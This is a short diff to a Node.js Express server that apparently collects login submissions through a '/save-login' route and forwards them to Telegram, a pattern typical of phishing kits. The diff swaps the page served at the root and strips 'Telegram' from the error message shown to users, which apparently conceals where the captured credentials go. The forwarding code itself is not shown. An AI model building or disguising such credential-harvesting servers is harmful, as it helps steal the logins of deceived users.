@@ -18,7 +18,7 @@ app.use(express.static('public'));
 
 // Serve the frontend login page
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(path.join(__dirname, 'public', 'api.html'));
 });
 
 // Route to handle login requests
@@ -53,7 +53,7 @@ app.post('/save-login', async (req, res) => {
         res.status(200).json({ message: 'Logged in successfully. Redirecting...' });
     } catch (error) {
         console.error('Error sending to Telegram:', error);
-        res.status(500).json({ error: 'Could not send data to Telegram.' });
+        res.status(500).json({ error: 'Could not send data.' });
     }
 });
 
